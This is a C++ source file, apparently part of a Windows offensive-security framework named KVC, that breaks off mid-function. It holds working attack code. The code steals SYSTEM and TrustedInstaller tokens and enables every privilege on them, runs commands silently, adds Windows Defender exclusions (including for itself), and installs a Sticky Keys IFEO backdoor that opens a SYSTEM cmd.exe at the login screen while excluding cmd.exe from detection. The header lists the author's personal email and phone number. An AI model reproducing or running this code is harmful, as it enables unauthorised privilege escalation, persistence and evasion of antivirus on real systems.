/*******************************************************************************
  _  ____     ______ 
 | |/ /\ \   / / ___|
 | ' /  \ \ / / |    
 | . \   \ V /| |___ 
 |_|\_\   \_/  \____|

The **Kernel Vulnerability Capabilities (KVC)** framework represents a paradigm shift in Windows security research, 
offering unprecedented access to modern Windows internals through sophisticated ring-0 operations. Originally conceived 
as "Kernel Process Control," the framework has evolved to emphasize not just control, but the complete **exploitation 
of kernel-level primitives** for legitimate security research and penetration testing.

KVC addresses the critical gap left by traditional forensic tools that have become obsolete in the face of modern Windows 
security hardening. Where tools like ProcDump and Process Explorer fail against Protected Process Light (PPL) and Antimalware 
Protected Interface (AMSI) boundaries, KVC succeeds by operating at the kernel level, manipulating the very structures 
that define these protections.

  -----------------------------------------------------------------------------
  Author : Marek Wesołowski
  Email  : marek@wesolowski.eu.org
  Phone  : +48 607 440 283 (Tel/WhatsApp)
  Date   : 04-09-2025

*******************************************************************************/

#include "TrustedInstallerIntegrator.h"
#include "common.h" // Assumed to contain SUCCESS, ERROR, INFO macros
#include <tchar.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <objbase.h>
#include <iostream>
#include <algorithm>
#include <cctype>
#include <filesystem>

namespace fs = std::filesystem;

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")

// A comprehensive set of system privileges to ensure maximum access rights when elevated.
const LPCWSTR TrustedInstallerIntegrator::ALL_PRIVILEGES[] = {
    L"SeAssignPrimaryTokenPrivilege", L"SeBackupPrivilege", L"SeRestorePrivilege",
    L"SeDebugPrivilege", L"SeImpersonatePrivilege", L"SeTakeOwnershipPrivilege",
    L"SeLoadDriverPrivilege", L"SeSystemEnvironmentPrivilege", L"SeManageVolumePrivilege",
    L"SeSecurityPrivilege", L"SeShutdownPrivilege", L"SeSystemtimePrivilege",
    L"SeTcbPrivilege", L"SeIncreaseQuotaPrivilege", L"SeAuditPrivilege",
    L"SeChangeNotifyPrivilege", L"SeUndockPrivilege", L"SeCreateTokenPrivilege",
    L"SeLockMemoryPrivilege", L"SeCreatePagefilePrivilege", L"SeCreatePermanentPrivilege",
    L"SeSystemProfilePrivilege", L"SeProfileSingleProcessPrivilege", L"SeCreateGlobalPrivilege",
    L"SeTimeZonePrivilege", L"SeCreateSymbolicLinkPrivilege", L"SeIncreaseBasePriorityPrivilege",
    L"SeRemoteShutdownPrivilege", L"SeIncreaseWorkingSetPrivilege"
};
const int TrustedInstallerIntegrator::PRIVILEGE_COUNT = sizeof(TrustedInstallerIntegrator::ALL_PRIVILEGES) / sizeof(LPCWSTR);

// A simple caching mechanism for the TrustedInstaller token to improve performance on subsequent calls.
static HANDLE g_cachedTrustedInstallerToken = nullptr;
static DWORD g_lastTokenAccessTime = 0;
static const DWORD TOKEN_CACHE_TIMEOUT = 30000; // Cache validity period: 30 seconds

/*************************************************************************************************/
/* CONSTRUCTOR / DESTRUCTOR                                   */
/*************************************************************************************************/

TrustedInstallerIntegrator::TrustedInstallerIntegrator()
{
    // Initialize the COM library for use by this thread. Required for shell operations like ResolveLnk.
    CoInitialize(NULL);
}

TrustedInstallerIntegrator::~TrustedInstallerIntegrator()
{
    // Uninitialize the COM library and release any cached resources.
    CoUninitialize();
    
    if (g_cachedTrustedInstallerToken) {
        CloseHandle(g_cachedTrustedInstallerToken);
        g_cachedTrustedInstallerToken = nullptr;
    }
}

/*************************************************************************************************/
/* PUBLIC API: PROCESS & COMMAND EXECUTION                           */
/*************************************************************************************************/

/**
 * @brief Executes a command line with TrustedInstaller privileges, showing console output.
 * @param commandLine The command or path to the executable to run. Resolves .lnk files automatically.
 * @return true if the process was started successfully, false otherwise.
 */
bool TrustedInstallerIntegrator::RunAsTrustedInstaller(const std::wstring& commandLine)
{
    std::wstring finalCommandLine = commandLine;
    
    // If the path points to a shortcut (.lnk), resolve it to its target.
    if (IsLnkFile(commandLine.c_str()))
    {
        std::wcout << L"Resolving shortcut: " << commandLine << std::endl;
        finalCommandLine = ResolveLnk(commandLine.c_str());
        
        if (finalCommandLine.empty())
        {
            std::wcout << L"Failed to resolve shortcut, cannot execute .lnk file directly." << std::endl;
            return false;
        }
        
        std::wcout << L"Resolved shortcut to: " << finalCommandLine << std::endl;
    }
    
    std::wcout << L"Executing with elevated system privileges: " << finalCommandLine << std::endl;
    
    // Acquire necessary privileges and impersonate SYSTEM to access TrustedInstaller.
    if (!ImpersonateSystem())
    {
        std::wcout << L"Failed to impersonate SYSTEM account: " << GetLastError() << std::endl;
        return false;
    }

    // Ensure the TrustedInstaller service is running and get its PID.
    DWORD trustedInstallerPid = StartTrustedInstallerService();
    if (trustedInstallerPid == 0)
    {
        std::wcout << L"Failed to start elevated system service: " << GetLastError() << std::endl;
        RevertToSelf();
        return false;
    }

    // Create the process using the TrustedInstaller token.
    BOOL result = CreateProcessAsTrustedInstaller(trustedInstallerPid, finalCommandLine.c_str());
    if (!result)
    {
        std::wcout << L"Failed to create process with elevated privileges: " << GetLastError() << std::endl;
    }
    else
    {
        std::wcout << L"Process started successfully with maximum system privileges" << std::endl;
    }

    RevertToSelf(); // Always revert impersonation.
    return result != FALSE;
}

/**
 * @brief Executes a command line with TrustedInstaller privileges silently (no window).
 * @param commandLine The command or path to the executable to run. Resolves .lnk files automatically.
 * @return true if the process completed successfully with exit code 0, false otherwise.
 */
bool TrustedInstallerIntegrator::RunAsTrustedInstallerSilent(const std::wstring& commandLine)
{
    std::wstring finalCommandLine = commandLine;
    
    // Resolve shortcut if needed.
    if (IsLnkFile(commandLine.c_str()))
    {
        finalCommandLine = ResolveLnk(commandLine.c_str());
        if (finalCommandLine.empty()) {
            return false;
        }
    }
    
    if (!ImpersonateSystem()) {
        return false;
    }

    DWORD trustedInstallerPid = StartTrustedInstallerService();
    if (trustedInstallerPid == 0) {
        RevertToSelf();
        return false;
    }

    BOOL result = CreateProcessAsTrustedInstallerSilent(trustedInstallerPid, finalCommandLine.c_str());

    RevertToSelf();
    return result != FALSE;
}

/*************************************************************************************************/
/* PUBLIC API: WINDOWS DEFENDER EXCLUSION MANAGEMENT                    */
/*************************************************************************************************/

/**
 * @brief Adds a Windows Defender exclusion of a specific type.
 * @param type The type of exclusion (Path, Process, Extension, IpAddress).
 * @param value The value to exclude (e.g., "C:\\temp", "cmd.exe", ".tmp", "192.168.1.1").
 * @return true if the exclusion was added successfully, false otherwise.
 */
bool TrustedInstallerIntegrator::AddDefenderExclusion(ExclusionType type, const std::wstring& value)
{
    std::wstring processedValue = value;
    
    // Perform type-specific validation and normalization.
    switch (type) {
        case ExclusionType::Extensions:
            if (!ValidateExtension(value)) {
                ERROR(L"Invalid extension format: %s", value.c_str());
                return false;
            }
            processedValue = NormalizeExtension(value);
            break;
            
        case ExclusionType::IpAddresses:
            if (!ValidateIpAddress(value)) {
                ERROR(L"Invalid IP address format: %s", value.c_str());
                return false;
            }
            break;
            
        case ExclusionType::Processes:
            // If a full path is provided, extract only the filename.
            if (value.find(L'\\') != std::wstring::npos) {
                fs::path path(value);
                processedValue = path.filename().wstring();
                INFO(L"Extracted process name from path: %s", processedValue.c_str());
            }
            break;
            
        case ExclusionType::Paths:
            // No special processing needed for paths.
            break;
    }
    
    // Escape single quotes for PowerShell command line.
    std::wstring escapedValue;
    for (wchar_t c : processedValue) {
        if (c == L'\'')
            escapedValue += L"''";
        else
            escapedValue += c;
    }
    
    std::wstring typeStr = GetExclusionTypeString(type);
    std::wstring command = L"powershell -Command \"Add-MpPreference -Exclusion" + typeStr + L" '" + escapedValue + L"'\"";
    
    bool result = RunAsTrustedInstallerSilent(command);
    
    if (result) {
        SUCCESS(L"Successfully added to Windows Defender %s exclusions: %s", typeStr.c_str(), processedValue.c_str());
    } else {
        INFO(L"AV exclusion skipped: %s %s", typeStr.c_str(), processedValue.c_str());
    }
    
    return result;
}

/**
 * @brief Removes a Windows Defender exclusion of a specific type.
 * @param type The type of exclusion to remove.
 * @param value The value to remove from exclusions.
 * @return true if the exclusion was removed successfully, false otherwise.
 */
bool TrustedInstallerIntegrator::RemoveDefenderExclusion(ExclusionType type, const std::wstring& value)
{
    std::wstring processedValue = value;
    
    // Apply same normalization as in the Add method for consistency.
    switch (type) {
        case ExclusionType::Extensions:
            processedValue = NormalizeExtension(value);
            break;
        case ExclusionType::Processes:
            if (value.find(L'\\') != std::wstring::npos) {
                fs::path path(value);
                processedValue = path.filename().wstring();
            }
            break;
    }
    
    std::wstring escapedValue;
    for (wchar_t c : processedValue) {
        if (c == L'\'')
            escapedValue += L"''";
        else
            escapedValue += c;
    }
    
    std::wstring typeStr = GetExclusionTypeString(type);
    std::wstring command = L"powershell -Command \"Remove-MpPreference -Exclusion" + typeStr + L" '" + escapedValue + L"'\"";
    
    bool result = RunAsTrustedInstallerSilent(command);
    
    if (result) {
        SUCCESS(L"Successfully removed from Windows Defender %s exclusions: %s", typeStr.c_str(), processedValue.c_str());
    } else {
        INFO(L"AV cleanup skipped: %s %s", typeStr.c_str(), processedValue.c_str());
    }
    
    return result;
}

// Convenience wrappers for specific exclusion types.
bool TrustedInstallerIntegrator::AddPathExclusion(const std::wstring& path) { return AddDefenderExclusion(ExclusionType::Paths, path); }
bool TrustedInstallerIntegrator::AddProcessToDefenderExclusions(const std::wstring& processName) { return AddDefenderExclusion(ExclusionType::Processes, processName); }
bool TrustedInstallerIntegrator::RemoveProcessFromDefenderExclusions(const std::wstring& processName) { return RemoveDefenderExclusion(ExclusionType::Processes, processName); }
bool TrustedInstallerIntegrator::AddExtensionExclusion(const std::wstring& extension) { return AddDefenderExclusion(ExclusionType::Extensions, extension); }
bool TrustedInstallerIntegrator::RemoveExtensionExclusion(const std::wstring& extension) { return RemoveDefenderExclusion(ExclusionType::Extensions, extension); }
bool TrustedInstallerIntegrator::AddIpAddressExclusion(const std::wstring& ipAddress) { return AddDefenderExclusion(ExclusionType::IpAddresses, ipAddress); }
bool TrustedInstallerIntegrator::RemoveIpAddressExclusion(const std::wstring& ipAddress) { return RemoveDefenderExclusion(ExclusionType::IpAddresses, ipAddress); }

/**
 * @brief A comprehensive exclusion method, primarily for self-protection of the running executable.
 * If no path is provided, it excludes the current executable by both path and process name.
 * @param customPath Optional path to a file to exclude. If empty, uses the current executable's path.
 * @return true on success, false on failure.
 */
bool TrustedInstallerIntegrator::AddToDefenderExclusions(const std::wstring& customPath)
{
    wchar_t currentPath[MAX_PATH];
    
    if (customPath.empty()) {
        if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) {
            ERROR(L"Failed to get current module path");
            return false;
        }
    } else {
        if (customPath.length() >= MAX_PATH) {
            ERROR(L"File path too long");
            return false;
        }
        wcscpy_s(currentPath, MAX_PATH, customPath.c_str());
    }

    fs::path filePath(currentPath);
    bool isExecutable = (filePath.extension().wstring() == L".exe");
    bool isSelfProtection = customPath.empty();

    // For self-protection, add both path and process exclusions for robustness.
    if (isSelfProtection && isExecutable) {
        bool pathSuccess = AddPathExclusion(currentPath);
        bool processSuccess = AddProcessToDefenderExclusions(filePath.filename().wstring());
        
        if (pathSuccess && processSuccess) {
            SUCCESS(L"Self-protection: added to both path and process exclusions");
            return true;
        } else if (pathSuccess) {
            SUCCESS(L"Self-protection: added to path exclusions (process exclusion failed)");
            return true;
        }
        return false;
    }

    // For other files, use process exclusion for executables and path for everything else.
    if (isExecutable) {
        return AddProcessToDefenderExclusions(filePath.filename().wstring());
    } else {
        return AddPathExclusion(currentPath);
    }
}

/**
 * @brief A comprehensive exclusion removal method.
 * If no path is provided, it removes exclusions for the current executable.
 * @param customPath Optional path to a file to remove from exclusions. If empty, uses the current executable's path.
 * @return true on success, false on failure.
 */
bool TrustedInstallerIntegrator::RemoveFromDefenderExclusions(const std::wstring& customPath)
{
    wchar_t currentPath[MAX_PATH];
    
    if (customPath.empty()) {
        if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) {
            ERROR(L"Failed to get current module path");
            return false;
        }
    } else {
        if (customPath.length() >= MAX_PATH) {
            ERROR(L"File path too long");
            return false;
        }
        wcscpy_s(currentPath, MAX_PATH, customPath.c_str());
    }

    fs::path filePath(currentPath);
    bool isExecutable = (filePath.extension().wstring() == L".exe");

    if (isExecutable) {
        return RemoveProcessFromDefenderExclusions(filePath.filename().wstring());
    } else {
        return RemoveDefenderExclusion(ExclusionType::Paths, currentPath);
    }
}


/*************************************************************************************************/
/* PUBLIC API: CONTEXT MENU INTEGRATION                              */
/*************************************************************************************************/

/**
 * @brief Adds a "Run as TrustedInstaller" entry to the context menu for .exe and .lnk files.
 * @return true if registry keys were created successfully, false otherwise.
 */
bool TrustedInstallerIntegrator::AddContextMenuEntries()
{
    wchar_t currentPath[MAX_PATH];
    GetModuleFileNameW(NULL, currentPath, MAX_PATH);
    
    // Command format: "C:\path\to\this.exe" trusted "%1"
    std::wstring command = L"\"";
    command += currentPath;
    command += L"\" trusted \"%1\"";
    
    std::wstring iconPath = L"shell32.dll,77"; // Standard shield icon
    
    HKEY hKey;
    DWORD dwDisposition;
    
    // Add context menu for .exe files
    if (RegCreateKeyExW(HKEY_CLASSES_ROOT, L"exefile\\shell\\RunAsTrustedInstaller", 0, NULL, REG_OPTION_NON_VOLATILE, 
                       KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS)
    {
        std::wstring menuText = L"Run as TrustedInstaller";
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)menuText.c_str(), 
                      (DWORD)(menuText.length() + 1) * sizeof(wchar_t));
        RegSetValueExW(hKey, L"Icon", 0, REG_SZ, (const BYTE*)iconPath.c_str(), 
                      (DWORD)(iconPath.length() + 1) * sizeof(wchar_t));
        RegSetValueExW(hKey, L"HasLUAShield", 0, REG_SZ, (const BYTE*)L"", sizeof(wchar_t));
        RegCloseKey(hKey);
    }
    
    std::wstring exeCommandPath = L"exefile\\shell\\RunAsTrustedInstaller\\command";
    if (RegCreateKeyExW(HKEY_CLASSES_ROOT, exeCommandPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE,
                       KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS)
    {
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)command.c_str(), 
                      (DWORD)(command.length() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
    
    // Add context menu for .lnk files (shortcuts)
    if (RegCreateKeyExW(HKEY_CLASSES_ROOT, L"lnkfile\\shell\\RunAsTrustedInstaller", 0, NULL, REG_OPTION_NON_VOLATILE,
                       KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS)
    {
        std::wstring menuText = L"Run as TrustedInstaller";
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)menuText.c_str(), 
                      (DWORD)(menuText.length() + 1) * sizeof(wchar_t));
        RegSetValueExW(hKey, L"Icon", 0, REG_SZ, (const BYTE*)iconPath.c_str(), 
                      (DWORD)(iconPath.length() + 1) * sizeof(wchar_t));
        RegSetValueExW(hKey, L"HasLUASShield", 0, REG_SZ, (const BYTE*)L"", sizeof(wchar_t));
        RegCloseKey(hKey);
    }
    
    std::wstring lnkCommandPath = L"lnkfile\\shell\\RunAsTrustedInstaller\\command";
    if (RegCreateKeyExW(HKEY_CLASSES_ROOT, lnkCommandPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE,
                       KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS)
    {
        RegSetValueExW(hKey, NULL, 0, REG_SZ, (const BYTE*)command.c_str(), 
                      (DWORD)(command.length() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
    
    SUCCESS(L"Successfully added context menu entries for .exe and .lnk files");
    return true;
}

/*************************************************************************************************/
/* PUBLIC API: STICKY KEYS BACKDOOR (SENSITIVE)                      */
/*************************************************************************************************/

/**
 * @brief FLAG: SENSITIVE FUNCTIONALITY.
 * Installs a "Sticky Keys" backdoor using the Image File Execution Options (IFEO) registry key.
 * This makes pressing the Shift key 5 times on the login screen open a SYSTEM command prompt.
 * It also attempts to add cmd.exe to Defender exclusions to prevent detection.
 * @return true on success, false on failure.
 */
bool TrustedInstallerIntegrator::InstallStickyKeysBackdoor() noexcept
{
    INFO(L"Installing sticky keys backdoor with Defender bypass...");
    
    // Add cmd.exe to Defender exclusions to prevent behavioral detection.
    if (!AddProcessToDefenderExclusions(L"cmd.exe")) {
        INFO(L"AV exclusion skipped for cmd.exe (continuing)");
    }
    
    // Create the IFEO registry key for sethc.exe.
    HKEY hKey;
    std::wstring keyPath = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe";
    LONG result = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, NULL, 
                                  REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    
    if (result != ERROR_SUCCESS) {
        ERROR(L"Failed to create IFEO registry key: %d", result);
        RemoveProcessFromDefenderExclusions(L"cmd.exe"); // Attempt cleanup on failure.
        return false;
    }
    
    // Set the "Debugger" value to point to cmd.exe.
    std::wstring debuggerValue = L"cmd.exe";
    result = RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, 
                           reinterpret_cast<const BYTE*>(debuggerValue.c_str()),
                           static_cast<DWORD>((debuggerValue.length() + 1) * sizeof(wchar_t)));
    
    RegCloseKey(hKey);
    
    if (result != ERROR_SUCCESS) {
        ERROR(L"Failed to set Debugger registry value: %d", result);
        RemoveProcessFromDefenderExclusions(L"cmd.exe"); // Attempt cleanup on failure.
        return false;
    }
    
    SUCCESS(L"Sticky keys backdoor installed successfully");
    SUCCESS(L"Press 5x Shift on login screen to get SYSTEM cmd.exe");
    return true;
}

/**
 * @brief FLAG: SENSITIVE FUNCTIONALITY.
 * Removes the "Sticky Keys" backdoor by deleting the IFEO registry key and the Defender exclusion.
 * @return true if removal was successful, false if errors occurred.
 */
bool TrustedInstallerIntegrator::RemoveStickyKeysBackdoor() noexcept
{
    INFO(L"Removing sticky keys backdoor...");
    
    bool success = true;
    
    // Remove the IFEO registry key.
    std::wstring keyPath = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe";
    LONG result = RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath.c_str());
    
    if (result != ERROR_SUCCESS && result != ERROR_FILE_NOT_FOUND) {
        ERROR(L"Failed to remove IFEO registry key: %d", result);
        success = false;
    } else if (result == ERROR_SUCCESS) {
        SUCCESS(L"IFEO registry key removed");
    }
    
    // Remove cmd.exe from Defender exclusions.
    if (!RemoveProcessFromDefenderExclusions(L"cmd.exe")) {
        INFO(L"AV cleanup skipped for cmd.exe");
    }
    
    if (success) {
        SUCCESS(L"Sticky keys backdoor removed successfully");
    } else {
        INFO(L"Sticky keys backdoor removal completed with some errors");
    }
    
    return success;
}

/*************************************************************************************************/
/* PRIVATE: TOKEN & PROCESS IMPLEMENTATION                           */
/*************************************************************************************************/

/**
 * @brief Retrieves a cached TrustedInstaller token or acquires a new one.
 * The process involves enabling debug privileges, impersonating SYSTEM, finding the
 * TrustedInstaller service, and duplicating its process token.
 * @return A handle to a duplicated TrustedInstaller token, or nullptr on failure.
 */
HANDLE TrustedInstallerIntegrator::GetCachedTrustedInstallerToken() {
    DWORD currentTime = GetTickCount();
    
    // Return cached token if it's still within the timeout period.
    if (g_cachedTrustedInstallerToken && (currentTime - g_lastTokenAccessTime) < TOKEN_CACHE_TIMEOUT) {
        return g_cachedTrustedInstallerToken;
    }
    
    if (g_cachedTrustedInstallerToken) {
        CloseHandle(g_cachedTrustedInstallerToken);
        g_cachedTrustedInstallerToken = nullptr;
    }
    
    // Enable privileges required to interact with system processes.
    if (!EnablePrivilege(L"SeDebugPrivilege") || !EnablePrivilege(L"SeImpersonatePrivilege")) {
        ERROR(L"Failed to enable required privileges (SeDebug/SeImpersonate)");
        return nullptr;
    }
    
    if (!ImpersonateSystem()) {
        ERROR(L"Failed to impersonate SYSTEM");
        return nullptr;
    }
    
    DWORD trustedInstallerPid = StartTrustedInstallerService();
    if (!trustedInstallerPid) {
        ERROR(L"Failed to start TrustedInstaller service");
        RevertToSelf();
        return nullptr;
    }
    
    HANDLE hTrustedInstallerProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, trustedInstallerPid);
    if (!hTrustedInstallerProcess) {
        ERROR(L"Failed to open TrustedInstaller process (error: %d)", GetLastError());
        RevertToSelf();
        return nullptr;
    }
    
    HANDLE hTrustedInstallerToken;
    if (!OpenProcessToken(hTrustedInstallerProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hTrustedInstallerToken)) {
        ERROR(L"Failed to open TrustedInstaller token (error: %d)", GetLastError());
        CloseHandle(hTrustedInstallerProcess);
        RevertToSelf();
        return nullptr;
    }
    
    // Duplicate the token to use it for creating a new process.
    HANDLE hDuplicatedToken;
    if (!DuplicateTokenEx(hTrustedInstallerToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, 
                         TokenImpersonation, &hDuplicatedToken)) {
        ERROR(L"Failed to duplicate TrustedInstaller token (error: %d)", GetLastError());
        CloseHandle(hTrustedInstallerToken);
        CloseHandle(hTrustedInstallerProcess);
        RevertToSelf();
        return nullptr;
    }
    
    CloseHandle(hTrustedInstallerToken);
    CloseHandle(hTrustedInstallerProcess);
    RevertToSelf();
    
    // Elevate all possible privileges on the new token for maximum power.
    for (int i = 0; i < PRIVILEGE_COUNT; i++) {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        if (LookupPrivilegeValueW(NULL, ALL_PRIVILEGES[i], &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hDuplicatedToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        }
    }
    
    // Cache the token.
    g_cachedTrustedInstallerToken = hDuplicatedToken;
    g_lastTokenAccessTime = currentTime;
    
    SUCCESS(L"TrustedInstaller token cached successfully");
    return g_cachedTrustedInstallerToken;
}

/**
 * @brief Creates a new process using the TrustedInstaller token.
 * @param pid The PID of the TrustedInstaller service (used for context, though token is key).
 * @param commandLine The command to execute.
 * @return TRUE on success, FALSE on failure.
 */
BOOL TrustedInstallerIntegrator::CreateProcessAsTrustedInstaller(DWORD pid, LPCWSTR commandLine)
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) return FALSE;

    wchar_t* mutableCmd = _wcsdup(commandLine);
    if (!mutableCmd) return FALSE;

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    BOOL result = CreateProcessWithTokenW(hToken, 0, NULL, mutableCmd, 0, NULL, NULL, &si, &pi);

    if (result)
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    free(mutableCmd);
    return result;
}

/**
 * @brief Creates a new process silently (no window) using the TrustedInstaller token.
 * Waits for the process to finish and checks its exit code.
 * @param pid The PID of the TrustedInstaller service.
 * @param commandLine The command to execute.
 * @return TRUE if the process ran and returned exit code 0, FALSE otherwise.
 */
BOOL TrustedInstallerIntegrator::CreateProcessAsTrustedInstallerSilent(DWORD pid, LPCWSTR commandLine)
{
    HANDLE hToken = GetCachedTrustedInstallerToken();
    if (!hToken) return FALSE;

    wchar_t* mutableCmd = _wcsdup(commandLine);
    if (!mutableCmd) return FALSE;

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide the window.
    
    PROCESS_INFORMATION pi;
    BOOL result = CreateProcessWithTokenW(
        hToken, 0, NULL, mutableCmd,
        CREATE_NO_WINDOW, // Creation flags for silent execution.
        NULL, NULL, &si, &pi
    );

    if (result)
    {
        // Wait up to 3 seconds for the process to complete.
        DWORD waitResult = WaitForSingleObject(pi.hProcess, 3000);
        
        if (waitResult == WAIT_OBJECT_0) {
            DWORD exitCode;
            GetExitCodeProcess(pi.hProcess, &exitCode);
            result = (exitCode == 0); // Success is defined by a 0 exit code.
        } else {
            if (waitResult == WAIT_TIMEOUT) TerminateProcess(pi.hProcess, 1);
            result = FALSE; // Failure on timeout or other errors.
        }
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    free(mutableCmd);
    return result;
}


/*************************************************************************************************/
/* PRIVATE: HELPER FUNCTIONS                                  */
/*************************************************************************************************/

/**
 * @brief Checks if a file path has a .lnk extension.
 */
BOOL TrustedInstallerIntegrator::IsLnkFile(LPCWSTR filePath)
{
    if (!filePath || wcslen(filePath) < 4) return FALSE;
    fs::path path(filePath);
    return _wcsicmp(path.extension().wstring().c_str(), L".lnk") == 0;
}

/**
 * @brief Resolves a .lnk shortcut file to its target path and arguments.
 */
std::wstring TrustedInstallerIntegrator::ResolveLnk(LPCWSTR lnkPath)
{
    std::wstring result;
    IShellLinkW* psl = nullptr;
    IPersistFile* ppf = nullptr;
    
    if (GetFileAttributesW(lnkPath) == INVALID_FILE_ATTRIBUTES) return result;

    HRESULT hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&psl);
    if (FAILED(hres)) return result;

    hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);
    if (FAILED(hres)) {
        psl->Release();
        return result;
    }

    hres = ppf->Load(lnkPath, STGM_READ);
    if (FAILED(hres)) {
        ppf->Release();
        psl->Release();
        return result;
    }

    wchar_t targetPath[MAX_PATH * 2] = {0};
    hres = psl->GetPath(targetPath, MAX_PATH * 2, NULL, SLGP_RAWPATH);
    if (SUCCEEDED(hres) && wcslen(targetPath) > 0)
    {
        result = targetPath;
        wchar_t args[MAX_PATH * 2] = {0};
        hres = psl->GetArguments(args, MAX_PATH * 2);
        if (SUCCEEDED(hres) && wcslen(args) > 0)
        {
            result += L" ";
            result += args;
        }
    }

    ppf->Release();
    psl->Release();
    return result;
}

/**
 * @brief Enables a specific privilege for the current process token.
 */
BOOL TrustedInstallerIntegrator::EnablePrivilege(LPCWSTR privilegeName)
{
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) return FALSE;

    LUID luid;
    if (!LookupPrivilegeValueW(NULL, privilegeName, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    CloseHandle(hToken);
    
    return result && (GetLastError() == ERROR_SUCCESS);
}

/**
 * @brief Impersonates the SYSTEM user by borrowing the token from the winlogon.exe process.
 * This is a critical step for gaining the necessary rights to interact with the TrustedInstaller service.
 */
BOOL TrustedInstallerIntegrator::ImpersonateSystem()
{
    // Enable debug privilege to open system-level processes.
    EnablePrivilege(L"SeDebugPrivilege");

    DWORD systemPid = GetProcessIdByName(L"winlogon.exe");
    if (systemPid == 0) return FALSE;

    HANDLE hSystemProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, systemPid);
    if (!hSystemProcess) return FALSE;

    HANDLE hSystemToken;
    if (!OpenProcessToken(hSystemProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hSystemToken)) {
        CloseHandle(hSystemProcess);
        return FALSE;
    }

    HANDLE hDuplicatedToken;
    if (!DuplicateTokenEx(hSystemToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hDuplicatedToken)) {
        CloseHandle(hSystemToken);
        CloseHandle(hSystemProcess);
        return FALSE;
    }

    BOOL result = ImpersonateLoggedOnUser(hDuplicatedToken);

    CloseHandle(hDuplicatedToken);
    CloseHandle(hSystemToken);
    CloseHandle(hSystemProcess);
    return result;
}

/**
 * @brief Ensures the TrustedInstaller service is running and returns its Process ID (PID).
 */
DWORD TrustedInstallerIntegrator::StartTrustedInstallerService()
{
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);
    if (!hSCManager) return 0;

    SC_HANDLE hService = OpenServiceW(hSCManager, L"TrustedInstaller", SERVICE_QUERY_STATUS | SERVICE_START);
    if (!hService) {
        CloseServiceHandle(hSCManager);
        return 0;
    }

    SERVICE_STATUS_PROCESS statusBuffer;
    DWORD bytesNeeded;
    const DWORD timeout = 30000; // 30-second timeout.
    DWORD startTime = GetTickCount();

    while (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&statusBuffer, sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded))
    {
        if (statusBuffer.dwCurrentState == SERVICE_RUNNING) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return statusBuffer.dwProcessId;
        }

        if (statusBuffer.dwCurrentState == SERVICE_STOPPED) {
            if (!StartServiceW(hService, 0, NULL)) {
                break; // Exit loop on start failure.
            }
        }

        if (GetTickCount() - startTime > timeout) {
            break; // Exit loop on timeout.
        }
        
        DWORD waitHint = statusBuffer.dwWaitHint > 0 ? statusBuffer.dwWaitHint : 100;
        Sleep(waitHint);
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0; // Return 0 on failure or timeout.
}

/**
 * @brief Finds the Process ID (PID) of a process by its executable name.
 */
DWORD TrustedInstallerIntegrator::GetProcessIdByName(LPCWSTR processName)
{
